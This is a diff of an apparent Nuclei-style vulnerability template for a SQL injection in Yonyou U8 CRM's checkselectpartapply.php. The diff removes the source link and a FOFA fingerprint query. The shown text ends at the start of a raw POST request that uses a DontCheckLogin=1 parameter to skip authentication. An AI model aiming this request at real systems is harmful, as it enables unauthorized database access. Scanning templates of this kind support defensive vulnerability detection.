@@ -3,12 +3,8 @@ info:
   name: 用友U8 CRM checkselectpartapply.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="用友U8CRM"
 http:
 - raw:
   - 'POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1
